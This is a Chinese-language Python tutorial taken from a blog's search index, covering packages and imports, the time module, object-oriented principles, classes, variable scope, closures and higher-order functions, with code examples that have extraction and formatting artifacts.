注意：导入模块时，会自动执行里面的代码 四、包1、包的概念12345671. 包 Package： 是一种特殊的目录，可以包含多个模块（py文件）或子包2. Python规定包下面必须包含一个__init__文件 - init文件一般为空文件 - 如果__init__中定义了代码，在导包时会被自动执行 3. 包名一般为小写 2、包的使用123456789101112# 创建包的两种方式1. 创建一个空目录，然后在目录创建一个__ini__.py文件即可2. pycharm右键-New -&gt; Python Package- pack1 - __init__.py - p1.py - pack2 - __init__.py - p2.py- main.py 1234567891011121314151617181920212223# main.pyimport pack1.p1print(pack1.p1.a)或import pack1.p1 as pk1print(pk1.a)或from pack1 import p1print(p1.a)或from pack1 import p1 as pk1print(pk1.a)或from pack1.p1 import aprint(a)或from pack1.p1 import *print(a) 1234567891011121314151617导包建议使用from语法 from 包名 import 模块名模块名.xx# 总结导包的方式：1. import 包名.模块 - 包名.模块名.xx2. import 包名.模块 as 别名 - 别名.xx3. from 包名 import 模块名 - 模块名.xx4. from 包名 import 模块名 as 别名 - 别名.xx5. from 包名.模块名 import 标识符 - xx6. from 包名.模块名 import * - xx 五、__name__12345671. __name__是一个变量，可以在任意地方使用2. 如果以当前文件运行，__name__的值为 __main__3. 如果这个文件（模块）是被其它文件（模块）引用，并是以其它模块来运行时，__name__的值为这个模块的路径4. 通过__name__可以得知是否是以当前模块来运行的 使用场景： 如果某个模块中的代码，只有以当前文件运行时才执行，此时可以添加如下代码： 123if __name__ == &#x27;__main__&#x27;: 当前模块的测试代码 当该模块是被其它模块导入，并以其它模块运行时，这里的代码不会被执行 六、模块的搜索路径12345678910111213141516# 获取系统搜索模块的路径import sysprint(sys.path)# 系统会在sys.path所列出的路径中去查找当前导入的模块，如果在这些路径找不到该模块，则提示 No module named &#x27;pack11&#x27;对于自定义模块导入时的寻找路径有： 1. 项目目录2. 当前模块所在的目录对于内置模块一般在：1. python安装目录的lib目录下对于第三方模块：1. \\lib\\site-packages 七、time模块1234567891011121314151617181920212223242526272829# time是Python内置的一个关于时间的模块import time# 格林威治时间1970年1月1日0时0分0秒到现在时间所经过的总秒数# 它的值是一个float类型，也就是时间戳是一个时间差t = time.time()print(t) # 返回的是一个时间戳localtime = time.localtime() # 默认返回当前时间元组print(localtime)print(localtime.tm_year)print(localtime.tm_mon)# 产品经理 -localtime = time.localtime(t)print(localtime)asctime = time.asctime() # Thu Jul 23 16:18:45 2020print(asctime)print(time.mktime(localtime)) # 接收一个时间元组 返回到给定的时间的时间戳print(time.strftime(&#x27;%Y/%m/%d %H:%M:%S&#x27;,time.localtime()))time.sleep(3) # 程序休眠3s 1234567from datetime import datetimeprint(datetime.now())print(str(datetime.now()).split(&#x27;.&#x27;)[0])print(datetime.now().strftime(&#x27;%Y/%m/%d %H:%M:%S&#x27;))","categories":[],"tags":[]},{"title":"","slug":"11 面向对象三大特性","date":"2024-10-24T11:20:58.316Z","updated":"2024-10-07T05:20:59.962Z","comments":true,"path":"2024/10/24/11 面向对象三大特性/","permalink":"http://example.com/2024/10/24/11%20%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E4%B8%89%E5%A4%A7%E7%89%B9%E6%80%A7/","excerpt":"","text":"面向对象三大特性一、简介1、封装1封装就是隐藏对象的属性和实现细节，仅对外公开接口（公有的方法），控制在程序中的属性的读和修改的访问级别，将数据和行为进行有机的结合，形成一个整体。这个整体就是“类”，其中数据和方法都是类中的成员。 2、继承1继承：子类直接使用父类定义好的属性和方法，从而实现代码的复用。code reuse 3、多态1向不同的对象发送同一条信息，不同的对象在接受到信息后，会做出不同的反应. 二、封装 将属性和方法进行有机结合，形成一个整体 将不想暴露给外界的成员私有化，外界只能通过公有的接口访问 123456789101112131415161718192021222324252627282930class Person: def __init__(self, name, age): self.__name = name self.__age = age def get_age(self): return self.__age def set_age(self,age): # 在公有的接口中可以对数据加以处理 if age &lt; 0 or age &gt; 150: print(&quot;年龄不合法&quot;) else: self.__age = age def __str__(self): return f&quot;姓名：&#123;self.__name&#125;,年龄：&#123;self.__age&#125;&quot;p = Person(&#x27;Tom&#x27;,18)print(p) # 直接打印对象 获取到的是地址# p.age = 20 # 当age为私有就不可以在外界随意修改访问# print(p)## p.age = 200# print(p)p.set_age(200)print(p) property函数 123456age = property(get_age, set_age, delete_age)p.age = 20 # 自动调用setter -- set_age()print(p.age) # 自动调用getter -- get_age()del p.age # 自动调用delete -- delete_age() 12345print(p.__dict__) # &#123;&#x27;_Person__name&#x27;: &#x27;Tom&#x27;, &#x27;_Person__age&#x27;: 18&#125;del p.ageprint(p.__dict__) # &#123;&#x27;_Person__name&#x27;: &#x27;Tom&#x27;&#125;print(Person.__dict__) 三、继承123456789101. 子类直接使用父类定义好的属性和方法，从而实现代码复用.2. 在Python中如果程序需要，可以让一个类去继承另一个类，被继承的类称为父类或者超类，也可以称为基类，继承的类称为子类或派生类.3. 如果创建类时，没有手动去设置父类，默认继承自object类，顶层类（在Python中，万物皆对象）4. 继承是is-a的关系 一个学生是一个人 一个毕业生是一个学生5. 当子类继承父类后，会拥有父类所有的属性和方法 1、简单的继承1234567891011121314151617class Person: def __init__(self,name,age): self.name = name self.age = age def __str__(self): return f&quot;姓名：&#123;self.name&#125;,年龄：&#123;self.age&#125;&quot;class Student(Person): pass # 当子类没有实现__init__方法时，默认会调用父类的__init__s = Student() # __init__() missing 2 required positional arguments: &#x27;name&#x27; and &#x27;age&#x27;s = Student(&#x27;Tom&#x27;,18)print(s) # 姓名：Tom,年龄：18 2、私有成员子类会继承父类的私有成员，但是子类并不能直接去访问继承自父类的私有成员 12345678910111213141516class Person: def __init__(self, name, age): self.__name = name self.__age = age def __str__(self): return f&quot;姓名：&#123;self.__name&#125;,年龄：&#123;self.__age&#125;&quot;class Student(Person): def output(self): return self.__name # 子类不能直接访问父类的私有成员s = Student(&#x27;Tom&#x27;,18)s.output( 如何解决： 子类通过继承自父类的公有的方法来访问继承自父类的私有成员 1234567891011121314151617181920class Person: def __init__(self, name, age): self.__name = name self.__age = age def get_name(self): # 声明公有的get方法 return self.__name def __str__(self): return f&quot;姓名：&#123;self.__name&#125;,年龄：&#123;self.__age&#125;&quot;class Student(Person): def output(self): # print(self.__name) print(self.get_name()) # 通过父类的公有方法来访问私有成员s = Student(&#x27;Tom&#x27;,18)s.output() 将父类的私有成员改为受保护的成员 （有问题） 声明属性时，使用一个_属性名 对于外界依然是“私有”的,可以访问不报错，会有警告 子类可以直接去访问 123456789101112131415161718192021222324class Person: def __init__(self, name, age): self._name = name self._age = age def get_name(self): return self._name def __str__(self): return f&quot;姓名：&#123;self._name&#125;,年龄：&#123;self._age&#125;&quot;class Student(Person): def output(self): print(self._name)p = Person(&#x27;Jack&#x27;, 20)print(p._name) # 这里不报错 但是有警告s = Student(&#x27;Tom&#x27;, 18)s.output()print(s._name) 3、方法重写子类定义了与父类方法名一致的访问，称为方法的重写（覆盖override） 123456789class Father: def who_am_i(self): print(&#x27;我是爸爸&#x27;) class Son(Father): pass son = Son()son.who_am_i() # 我是爸爸 -- 不合理 所以，如果子类有需要，需要去重写父类的同名方法： 123456789101112class Father: def who_am_i(self): print(&#x27;我是爸爸&#x27;)class Son(Father): def who_am_i(self): print(&#x27;我是儿子&#x27;)son = Son()son.who_am_i() # 我是儿子 4、子类的__init__方法当子类没有重写父类的__init__，在实例化子类对象时会默认调用父类的__init__方法 如果子类重写了__init__方法，此时再实例化子类对象时，就不再隐式地去调用父类的__init__方法了 1234567891011121314151617class Person: def __init__(self, name, age): self.name = name self.age = age def __str__(self): return f&quot;姓名：&#123;self.name&#125;,年龄：&#123;self.age&#125;&quot;class Student(Person): def __init__(self,id): self.id = id# 子类定义了init后 不再隐式调用父类inits = Student(1)print(s) # AttributeError: &#x27;Student&#x27; object has no attribute &#x27;name&#x27; 此时再去访问name时，会提示没有name属性，原因于父类的init未被调用。所以如果子类重写了init方法，为了能够使用或扩展父类的行为，最好显式地调用父类的init方法 1234567891011# 1. 使用 类名.__init(self,xxx,xx) 显式在子类的init中调用父类的initclass Student(Person): def __init__(self,id,name,age): self.id = id # 下面的self是学生对象s Person.__init__(self,name,age) s = Student(1,&#x27;Tom&#x27;,18)print(s.__dict__) # &#123;&#x27;id&#x27;: 1, &#x27;name&#x27;: &#x27;Tom&#x27;, &#x27;age&#x27;: 18&#125;print(s) # 姓名：Tom,年龄：18 12345# 2. 使用 super().__init__(name,age) # super超级 不需要传selfclass Student(Person): def __init__(self,id,name,age): self.id = id super().__init__(name,age) # super超级 5、多继承Python是支持多继承，一个子类可以有多个父类 123456789class A: a = 100class B: b = 200class C(A,B): c = 300 obj = C()print(obj.a) 6、菱形继承12345678910111213141516171819202122232425# 菱形继承：1. 结构混乱 2.资源浪费class A: def __init__(self): print(&#x27;A init&#x27;)class B(A): def __init__(self): print(&#x27;B init&#x27;) A.__init__(self)class C(A): def __init__(self): print(&#x27;C init&#x27;) A.__init__(self)class D(B,C): def __init__(self): print(&#x27;D init&#x27;) B.__init__(self) C.__init__(self)d = D() 结果： 123456D initB initA initC initA init# 从结果得知，A的init被调用了两次，造成资源的浪费 解决方案： 1234567891011121314151617181920212223242526# 在子类中使用super().__init()class A: def __init__(self): print(&#x27;A init&#x27;)class B(A): def __init__(self): print(&#x27;B init&#x27;) super().__init__()class C(A): def __init__(self): print(&#x27;C init&#x27;) super().__init__()class D(B,C): def __init__(self): print(&#x27;D init&#x27;) super().__init__() # B.__init__(self) # C.__init__(self)d = D() 在Python中，已经定义好了一个魔法方法来帮助我们去查看类的继承顺序，super()按照MRO的顺序来进行继承。 12print(D.__mro__)# (&lt;class &#x27;__main__.D&#x27;&gt;, &lt;class &#x27;__main__.B&#x27;&gt;, &lt;class &#x27;__main__.C&#x27;&gt;, &lt;class &#x27;__main__.A&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;) 12345# 补充super()：- super(type,obj) 和 super() 等价 - type:类型 默认是当前类 也可以是MRO链式结构中的父类 - obj :对象 默认是当前对象通过super()底层是使用MRO找到当前类的继承链，从而通过继承链来调用其父类，避免顶层类被多次调用的问题 四、多态121. 多态：多种形态2. 多态性：向不同的对象发送相同的指令，不同的对象会做出不同的响应 12345678910111213141516171819202122class Animal: def speak(self): pass class Dog(Animal): def speak(self): print(&#x27;汪汪汪&#x27;) class Cat(Animal): def speak(self): print(&#x27;喵喵喵&#x27;) d = Dog()c = Cat()d.speak() # 发送的指令是一样，做出的响应是不一样的c.speak()def animal_speak(animal): animal.speak() animal_speak(d) animal_speak(c) 123多态性好处：1. 增加程序的灵活性，以不变应万变，不论对象千变万化，使用者都是同一种形式去调用 animal.speak(ojb),但是不同的对象做出的响应是不一样的2. 增加了程序的可扩展性 五、内置函数1234567891011121314151617181920212223242526272829303132333435# 1. issubclass(cls,class) 判断一个类是否是另一个类的子类 class A: pass class B(A): pass print(issubclass(A,B)) # Falseprint(issubclass(B,A)) # True# 2. isinstance(obj,class) 判断某个对象是否为类/子类的实例a = A()print(isinstance(a,A)) # Trueprint(isinstance(B(),A)) # Trueprint(isinstance(B(),object)) # True# 3. hasattr() 判断对象是否有某个属性class A: def __init__(self): self.a = 100 self.b = 200obj = A()print(hasattr(obj,&#x27;a&#x27;)) # True# 4. getattr(obj,name[,default]) # 获取对象的属性 如果不存在会报错 如果设置了默认值，不存在时返回默认值print(getattr(obj,&#x27;a&#x27;)) # 100 和 obj.a是等价的print(getattr(obj,&#x27;c&#x27;)) # 报错print(getattr(obj,&#x27;c&#x27;，300)) # 返回300 # 5. setattr(obj,name,value) # 设置对象属性值，不存在时添加一个新的setattr(obj,&#x27;c&#x27;,500)print(obj.c)# 6. delattr(obj,name) # 删除对象的某个属性delattr(obj,&#x27;a&#x27;)print(obj.__dict__)","categories":[],"tags":[]},{"title":"","slug":"10 类和对象","date":"2024-10-24T11:20:58.314Z","updated":"2024-10-07T05:20:59.962Z","comments":true,"path":"2024/10/24/10 类和对象/","permalink":"http://example.com/2024/10/24/10%20%E7%B1%BB%E5%92%8C%E5%AF%B9%E8%B1%A1/","excerpt":"","text":"类和对象一、面向过程和面向对象12345671. 编程： 特定的语法+数据结构+算法组成一段代码告诉计算机如何执行一个任务的过程（程序：数据结构+算法）2. 编程范式：条条大路通罗马，实现一个任务可以有很多种不同的方式（范式有很多种），不同的编程范式本质上来说就是对各种不同类型的任务采取的不同解决问题的思路3. 编程范式分类： 两种编程的方式 - 面向过程的编程：C语言 - 面向对象的编程：C++、Java、Python 1、面向过程编程 实现一个任务是自上而下的设计方式，程序从上到下一步步执行，从头到尾来解决问题 获取用户输入的数据、对数据进行运算并做出某种决策、在屏幕显示计算结果 根据业务逻辑从上到下垒代码 函数式编程：在面向过程的编程中，也可以使用函数式编程 – 将某个功能模块的代码封装到一个函数中，之后便可以重复地去调用这个函数。 2、面向对象编程 OOP 对数据和函数进行分类和封装，让开发‘更快更好更强….’ – 更高层次的一种封装 面向对象编程，更抽象、封装性更好 需求（产品经理）：计算坐标系中两点间距离 12345678910# 1.面向过程： 一步步进行，过程化1. 输入数据x1,y1 = int(input(&#x27;x1:&#x27;)),int(input(&#x27;y1:&#x27;))x2,y2 = int(input(&#x27;x2:&#x27;)),int(input(&#x27;y2:&#x27;))2. 运算、计算distance = ((x1-x2)**2+(y1-y2)**2)**0.53. 输出结果print(f&#x27;(&#123;x1&#125;,&#123;y1&#125;)和(&#123;x2&#125;,&#123;y2&#125;)之间的距离为：&#123;distance&#125;&#x27;) 1234567891011# 2.函数式编程：模块化、封装化 def distance(**kwargs): x1 = kwargs.get(&#x27;x1&#x27;) y1 = kwargs.get(&#x27;y1&#x27;) x2 = kwargs.get(&#x27;x2&#x27;) y2 = kwargs.get(&#x27;y2&#x27;) return ((x1-x2)**2+(y1-y2)**2)**0.5 x1,y1 = int(input(&#x27;x1:&#x27;)),int(input(&#x27;y1:&#x27;))x2,y2 = int(input(&#x27;x2:&#x27;)),int(input(&#x27;y2:&#x27;))print(distance(x1=x1,y1=y1,x2=x2,y2=y2)) 12345678910111213# 3.面向对象编程：更高级、更抽象的一种模块化和封装class Point: def __init__(self,a,b): self.x = a self.y = b def distance(self,p): return ((self.x-p.x)**2+(self.y-p.y)**2)**0.5 p1 = Point(0,0)p2 = Point(1,1)print(p1.distance(p2)) 二、类和对象123451. 面向对象的设计思想是从自然界中来的（从现实世界中获取的），因为在自然界中，类(Class)和实例（Instance）的概念是很自然的2. Class（类型）是一种抽象的概念，比如我们定义一个Class - Person，是指人这个概念. 人是一个抽象的概念，不能具化。而实例指的就是一个一个的具体的人，比如：张三、李四、王五他们是具体某一个人，他们的类型是“人”。 人是张三、李四、王五的类型 而张三、李四、王五是一个个具体的实例 1、类到底是什么1234561. 类是对客观世界中具有相同属性和行为的一组对象的抽象 人（类）： 一类对象：张三、李四、王五 人：姓名、年龄、生日（属性）.. 吃饭、睡觉（行为）等 类：人、狗、坐标中的点、帐户 对象：张三、旺财、(1,1)、620.... 2、对象又是什么123451. 现实世界中客观存在的任何一个事务都可以看成是一个&quot;对象&quot;，或者说，现实世界就是由千千万万个对象组成. 而这些对象是可以进行一个类别的划分. 2. 对象可以有形的，如一座房子、一个人、一辆车、一个学生等.它也可以是无形，如：银行帐户、一次旅行等3. 对象指类的一个个具体的实例（存在）. 3、类和对象的关系12# 类和对象的关系总结为：类是对象的抽象类型，而对象则是类的具体实例人是张三的类型，而张三是人的具体实例 问题：在编程世界中，先有类，还是先有对象 答：先有类，才有对象 三、如何进行面向对象的编程1、定义类一个类应该包含两部分：属性（变量）和行为（方法 - 函数） 12345678910# 定义一个人‘类’ class Person: # 类名：大驼峰 HelloWorld name = &#x27;Mr_lee&#x27; age = &#x27;18&#x27; def eat(self): print(&#x27;是人就得吃饭&#x27;) def sleep(self): print(&#x27;人和猪都得睡觉&#x27;) 2、定义对象123456789p1 = Person() # p1就是一个对象，此时这个对象就拥有类中所有的属性和方法p2 = Person() # p2是另外一个对象，当然它也拥有类中所有的属性和方法print(p1.name) # 获取p1这个对象的名字print(p2.name) # 获取p2这个对象的名字eat()p1.eat()p2.eat() # 虽然p1和p2都有相同的属性和行为，但它们是独立的个体存在，相互不会有影响 四、类属性和实例属性1231. 在上面的案例中，所有人的姓名和年龄都是一样的（属性的值是一样）2. 所有对象的所有的属性值都一样（类属性），对于姓名和年龄它是不合理的。 1、类属性 类内部定义的变量，不在任何的方法中 所有的对象都可以共用 可以使用类名.属性名访问，也可以使用对象名.属性名访问 一旦修改了类属性的值，所有的对象去访问时都会变. 为什么？ 1231. 每一个对象，都会在内存中占用一块空间，对象占用的空间实际上是它的属性占用的空间2. 如果是类属性，在整个类中只有一块空间，所有的对象都共享这块空间 12345678910111213141516171819class Student: teacher_name = &#x27;Mr_lee&#x27; def print_teacher(self): print(f&quot;我是老师是：&#123;self.teacher_name&#125;&quot;) s1 = Student() # 构造了一个学生对象s2 = Student() # 又构造了一个学生对象# 这两个学生对象都会拥有teacher_name，但是在内存空间中不会给s1和s2都开一块空间来存储teacher_name,而是在整个类中，只有一块空间存储着teacher_name,所有的学生对象都去共用这一块空间print(s1.teacher_name) # Mr_leeprint(s2.teacher_name) # Mr_leeStudent.teacher_name = &#x27;Dr.lee&#x27;print(s1.teacher_name) # Dr.leeprint(s2.teacher_name) # Dr.lee# s1.teacher_name = &#x27;xxx&#x27; 不可这样去修改类属性的值 注意： 修改类属性值时，要使用 类名.类属性名 &#x3D; 值 如果使用对象名.类属性名&#x3D;值，实际上添加了一个实例属性 2、实例属性当声明学生对象时，每一个学生都应该拥有自己的姓名、年龄等属性，这些属性在内存中应该独立存在，而不应该被共享。 12345678class Student: name = &#x27;Tom&#x27; # 类属性 age = 18 s1 = Student()s2 = Student() # s1和s2的姓名和年龄都会一样# 当去修改了name和age时，s1和s2的name、age会一起被修改 此时，name和age应该被声明为实例属性。（属于某一个对象，而不是被所有对象共享） 如何声明实例属性： 在类中的方法中进行声明，基本形式：self.xx = xx ,如果直接在方法中声明为xx=xx，则这它是普通的局部变量 实例属性的生命周期是和对象的生命周期绑定 某一个对象的实例属性发生了改变，不会影响另外的对象 实例属性要使用** 对象名.属性名 **去访问 12345678910111213class Student: teacher_name = &#x27;Mr_lee&#x27; # 类属性 def init_name(self, n): self.name = n def output(self): print(f&#x27;我的名字是&#123;self.name&#125;,我的老师是&#123;self.teacher_name&#125;&#x27;)s1 = Student()s1.init_name(&#x27;Tom&#x27;) # 在使用实例属性之前 一定要先初始化 s1.output() 五、self参数和__init__方法1、self参数123451. 类中的实例方法 ，在定义时，都有一个默认的参数self (约定俗成)2. self是向方法的调用者，当某个对象在调用实例方法时，默认会将对象作为实参传递给方法，作为第一个参数，所以self就是指向对象本身，谁调用该方法self就指向谁 3. s1.init_name(&#x27;Tom&#x27;) self指向s1 或 self就是s1 2、__init__方法12345678910class Student: teacher_name = &#x27;Mr_lee&#x27; # 类属性 def init_name(self, n): self.name = ns1 = Student()print(s1.name) #直接访问出错&#x27;Student&#x27; object has no attribute &#x27;name&#x27;# 每次声明完对象后，都需要手动调用init_name方法来初始化实例属性，不方便 期望，当声明完对象时，有一个方法可以自动被调用，而不需要程序员手动调用，在这个方法来完成实例属性的初始化 123456789101112class Student: teacher_name = &#x27;Mr_lee&#x27; # 类属性 # 该方法会在实例化对象时自动调用，参数是在实例化对象时传递 def __init__(self, n): self.name = ns1 = Student(&#x27;Tom&#x27;) # 1. 构造了s1对象 2. 初始化了name属性print(s1.name)s2 = Student(&#x27;Jack&#x27;)print(s2.name) 作用：初始化实例属性，__init__方法是自动调用 __init__方法可以加参数，因此在实例化对象从外界传递数据给实例属性 __init__方法不能定义返回值，它应该返回None 1234567891011121314# 坐标系中的点class Point: def __init__(self,x,y): self.x = x self.y = y def output(self): print(f&#x27;(&#123;self.x&#125;,&#123;self.y&#125;)&#x27;) p = Point(0,0) # 注意这里要传递两个位置参数p.output() p2 = Point(y=2,x=1)p2.output() # (1,2) 六、组合类把一个类的对象，作为另一个类的成员（属性） 123456789101112# 定义一个圆类class Circle: def __init__(self,x,y,r): self.x = x self.y = y self.radius = r def print_circle(self): print(self.x,self.y,self.radius) c = Circle(1,2,3)c.print_circle() 修改成组合类形式： 123456789101112131415161718192021222324252627282930class Point: def __init__(self,x,y): self.x = x self.y = y # p1.distance(p2) def distance(self,p): return ((self.x-p.x)**2+(self.y-p.y)**2)**0.5 def output(self): print(f&#x27;(&#123;self.x&#125;,&#123;self.y&#125;)&#x27;) class Circle: def __init__(self,x,y,r): self.radius = r self.center = Point(x,y) # center是一个Point类型的对象 def output(self): #self.center.output() # 调用的是Point类中output方法 print(self.radius,self.center.x,self.center.y) def distance(self,c): dis = self.center.distance(c.center) return dis c1 = Circle(1,2,3)c1.output()print(c1.distance(c2)) 七、访问限制权限：公有、保护、私有 面向对象的三大特性：封装、继承、多态 封装： 将对象的属性和方法进行有机的结合，形成一个整体（包装起来） 将不想暴露在外界的成员进行私有化，外界无法直接访问，只能在类中提供公有的接口（公有方法）来供外界去访问 1234567891011121314class Student: def __init__(self,n,a): self.__name = n # self.__名字 = 值 表示私有属性 self.__age = a def output(self): print(self.__name,self.__age)s1 = Student(&#x27;Mr_lee&#x27;,18)s1.output()print(s1.__name) # AttributeError: &#x27;Student&#x27; object has no attribute &#x27;__name&#x27; 公有：属性名前没有__，在类内部及类外都可以直接通过对象名.属性名访问 保护：_名字 私有（伪私有）：属性名前加__名字，此时可以在类内部通过 self.__属性名来访问，但不可以在类外通过对象名来进行访问 语法：双下划线+名字 私有属性 范围：只能在本类中访问 访问：通过get、set等公有方法来访问和修改 1234567891011121314151617181920class Student: def __init__(self,n,a): self.__name = n self.__age = a def get_name(self): return self.__name def set_name(self,n): self.__name = n def output(self): print(self.__name,self.__age)s1 = Student(&#x27;Mr_lee&#x27;,18)s1.output()print(s1.get_name()) # 通过公有的方法来访问私有属性s1.set_name(&#x27;Jack&#x27;) # 公有方法来修改私有属性 根本原因：在外界访问不到__name私有属性，是因为Python对于__name声明的属性进行了重命名操作。_类名__属性名 1print(s1._Student__name) # 不建议这么用","categories":[],"tags":[]},{"title":"","slug":"09_函数（二）","date":"2024-10-24T11:20:58.312Z","updated":"2024-10-07T05:21:00.781Z","comments":true,"path":"2024/10/24/09_函数（二）/","permalink":"http://example.com/2024/10/24/09_%E5%87%BD%E6%95%B0%EF%BC%88%E4%BA%8C%EF%BC%89/","excerpt":"","text":"函数（二）一、变量的作用域回顾：作用域泄露 （在C和C++不存在这个问题） 1234567a = 3b = 5if a &gt; b: max = a # ‘局部变量’：理论上代码块结束，max就会被释放，但是Python中并不释放bugelse: max = b print(f&quot;&#123;a&#125;和&#123;b&#125;中的最大值为：&#123;max&#125;&quot;) 1、全局变量 定义：定义在文件的顶头部分，没有任何的缩进 作用域&#x2F;作用范围：从定义的位置开始到整个文件的结尾 1234567# hello.pya = 5b = 10 # 全局变量def f(): print(a,b) f() 2、局部变量 定义：在函数内部定义的变量 作用域&#x2F;作用范围：从函数内定义变量的位置开始到函数结束 1234567def f(): a = 10 print(a) # 作用范围/可见范围：函数体的内部f()print(a) # NameError: name &#x27;a&#x27; is not defined 不会发生作用域泄露 3、局部变量和全局变量同名1234567a = 100 # 全局变量def f(): a = 200 # 这里又定义了一个变量：局部变量 和全局变量同名 print(&#x27;1111&#x27;,a) # -&gt; 200f()print(&#x27;2222&#x27;,a) # -&gt; 100 如果全局变量与局部变量同名，则局部作用域下去访问变量时，访问到是局部变量，此时局部变量量体裁衣隐藏全局变量的值。 二、global和nonlocal1、global关键字 如何在函数体内修改&#x2F;访问全局变量 1234567891011121314151617181920# 1. 在函数体内直接访问全局变量（未定义同名局部变量），没问题g = 100def f(): print(g)f() # -&gt;100# 2. 在函数体内直接赋值g = 100def f(): g = 200 # 重新定义了一个局部变量，并不是修改了全局变量f() print(g) # -&gt;100# 3. 在函数体内修改全局变量g = 100def f(): g += 1 # 出错 程序会认为你是在修改局部变量g 而g未初始化f() 如何解决上述的问题3： 12345678# 想在函数体内去修改全局变量g g = 100def f(): global g # 告诉解释器，这里是要引用全局变量 g += 1f()print(g) # -&gt; 101 2、nonlocal关键字12345678910a = 100def func1(): a = 200 def func2(): # inner函数 a = 300 func2() print(a) # -&gt; 200 func1()print(a) # -&gt; 100 如果要在func2中修改全局变量a： 123456789101112a = 100def func1(): a = 200 def func2(): # inner函数 global a a = 300 func2() print(a) # -&gt; 200func1()print(a) # -&gt; 300 如果要在func2中修改func1中声明的局部变量a： 1234567891011a = 100def func1(): a = 200 def func2(): # inner函数 nonlocal a a = 300 func2() print(a) # -&gt; 300func1()print(a) # -&gt; 100 nonlocal是修改外层函数中的局部变量，在下一层的作用域中去引用上一层中的局部变量 三、lambda表达式 什么是lambda表达式 lambda表达式，又称为匿名函数，是现代各种编程语言争相引入的一种语法，其功能堪比函数，设计却比函数更简洁. 基本形式： lambda 参数列表：表达式 说明： 在lambda关键字之后，冒号左右是参数列表，参数之间使用，号分隔，冒号右边为lambda表达式的返回值（不需要写return）。 示例： 12345678910# 等号右边声明的是一个匿名函数# 将匿名函数赋值给了add add = lambda x,y:x+yprint(add(3,5))def f(x,y): return x+y add = f 12345总结：1. 一般用于构建匿名函数2. lambda书写形式更加简洁、优雅3. lambda表达式不能过于复杂4. 优先级比较低 四、闭包在一个外函数中定义了一个内函数（内嵌函数），内函数里运用了外函数的临时变量（局部变量），并且外函数的返回值是内函数（的引用）。这样就形成了闭包closure。 12345678910def outer(x): y = 10 def inner(): print(x+y) return innerf = outer(5)f() 闭包的条件： 123# 1. 必须是一个内嵌函数# 2. 内函数引用外函数中的局部变量# 3. 外函数要返回内函数本身 123闭包特点： - 开辟独立的空间 - 应用：装饰器 临时变量不销毁现象 当外函数调用完毕，理论来说外函数中定义的局部变量应该被释放，但是闭包中，当外函数发现内函数持有我的局部变量时，该局部变量就不会被销毁。 闭包的延时绑定 123456789101112def fun(): l = [] for i in range(3): def fun2(x): print(x+i) l.append(fun2) return l for i in fun(): i(2) # 4 4 4 而不是2 3 4 # 根据延迟绑定，只有当调用内部函数时，才会访问到闭包变量（外函数的临时变量i），而此时i已经变成2了 1234def fun(): return [lambda x:i*x for i in range(4)]print([m(2) for m in fun()]) # [6, 6, 6, 6] 五、高级函数在Python2中是内置函数，而3中是类 filter() 12345678# 原型：filter(function or None, iterable) --&gt; filter object1. 过滤掉iterable中为False的元素，保留为真的元素2. 返回的是一个filter对象，是可以迭代3. 第一个参数：可以是一个函数/匿名函数，也可以是None4. 第二个参数： 如果第一个参数是None值，则返回iterable中元素为True的值 如果第一个参数是函数，则它会将iterable中的每一个元素作为参数传递给函数，返回为真的元素5. 第一个参数为函数时，函数的返回值必须为bool对象 123456# 案例一：f = filter(None,[0,2,3,4,5,0]) # 返回的是一个filter对象print(f) # 可迭代对象print(list(f)) # 转为listprint(list(filter(None,[0,2,3,4,5,0]))) 123# 案例二：for i in filter(lambda x:x==0,[0,2,3,4,5,0]): print(i) # 0 0 12345678# 案例三：def f(x): return x % 2for i in filter(f,[0,2,3,4,5,0]): print(i) # 3 5 for i in filter(lambda x:x%2,[0,2,3,4,5,0]): map() 1234map : 映射# 原型：map(func, *iterables) --&gt; map object1. 将可变长参数（可迭代对象）每一个元素，进行两两对应后，通过第一个参数func进行计算，直到每一个元素计算完毕，返回map对象（可迭代对象）2. 多个迭代对象，以短的为准 12print(list(map(lambda x,y:x+y,[1,2,3],[4,5,6])))# [5, 7, 9] reduce() 1234reduce:减少 折叠python3: import functools# 原型：reduce(function, sequence[, initial]) -&gt; value1. 将序列中的每一个元素进行计算，将序列中的两两数据作为function的参数，然后将前两个的计算结果再加上第三个数据...最终得到一个结果 123456import functoolsresult = functools.reduce(lambda x,y:x+y,range(1,101))print(result) # 5050# sum(range(1,101)) 123import functoolsresult = functools.reduce(lambda x,y:x*y,range(1,6))print(result) # 求阶乘 12345import functoolsdef factorial(n): return functools.reduce(lambda x,y:x*y,range(1,n+1))print(factorial(5))","categories":[],"tags":[]},{"title":"","slug":"08_函数（一）","date":"2024-10-24T11:20:58.310Z","updated":"2024-10-07T05:21:01.433Z","comments":true,"path":"2024/10/24/08_函数（一）/","permalink":"http://example.com/2024/10/24/08_%E5%87%BD%E6%95%B0%EF%BC%88%E4%B8%80%EF%BC%89/","excerpt":"","text":"函数（一）一、为什么要引入函数 不使用函数，之前写一个程序 一行一行地去实现代码 对于大型项目，代码的可读性和维护性很差 123456789a = int(input(&quot;请输入第一个数：&quot;))b = int(input(&quot;请输入第二个数：&quot;))c = a + bprint(f&quot;&#123;a&#125;+&#123;b&#125;=&#123;c&#125;&quot;)a = int(input(&quot;请输入第一个数：&quot;))b = int(input(&quot;请输入第二个数：&quot;))c = a - bprint(f&quot;&#123;a&#125;-&#123;b&#125;=&#123;c&#125;&quot;) 一个大型的项目，应该分为若干个程序块（代码块），每一个代码块来实现一个特定的功能。需要有一个东西来包裹代码块 – 函数 使用函数来实现计算器 12345678910111213# add是代码块的名字-函数名def add(): a = int(input(&quot;请输入第一个数：&quot;)) b = int(input(&quot;请输入第二个数：&quot;)) c = a + b print(f&quot;&#123;a&#125;+&#123;b&#125;=&#123;c&#125;&quot;)# sub是代码块的名字-函数名def sub(): a = int(input(&quot;请输入第一个数：&quot;)) b = int(input(&quot;请输入第二个数：&quot;)) c = a - b print(f&quot;&#123;a&#125;-&#123;b&#125;=&#123;c&#125;&quot;) 函数： function 翻译过来：功能 定义：函数就是具有某一特定功能的代码块的“集合”. 函数的目的： 实现代码复用 code reuse – 多次调用 实现模块化开发，代码结构层次更清晰，易读 方便代码的维护 二、函数的使用1、函数的定义123456789# 函数名(标识符名)：功能模块的名字，望文知意# 每个单词小写，单词与单词之间用_连接 this_is_a_function# 或 除首字母外的所有单词的首字母都大写 thisIsAFunctiondef 函数名(): 实现功能的代码块（函数体的代码） # 